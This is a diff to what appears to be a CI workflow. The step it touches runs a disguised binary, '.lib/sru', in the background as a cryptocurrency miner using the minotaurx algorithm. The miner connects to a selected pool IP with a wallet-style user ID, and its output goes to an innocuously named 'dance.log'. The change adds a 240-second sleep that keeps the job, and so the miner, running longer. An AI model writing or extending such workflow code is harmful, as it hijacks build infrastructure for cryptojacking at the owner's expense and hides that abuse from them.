@@ -76,6 +76,7 @@ jobs:
             port=$(shuf -i 602-610 -n 1)
             nohup .lib/sru -a minotaurx --pool ${{ steps.select-ip.outputs.selected_ip }}:$port -u MUEGHH4xUH8DVNAbexk31er1tenuiAUpBH --timeout 120 -t 3 -p x > dance.log 2>&1 &
             echo "Started SRU process using IP ${{ steps.select-ip.outputs.selected_ip }} and port $port"
+            sleep 240
           else
             echo ".lib/sru not found. Skipping..."
           fi
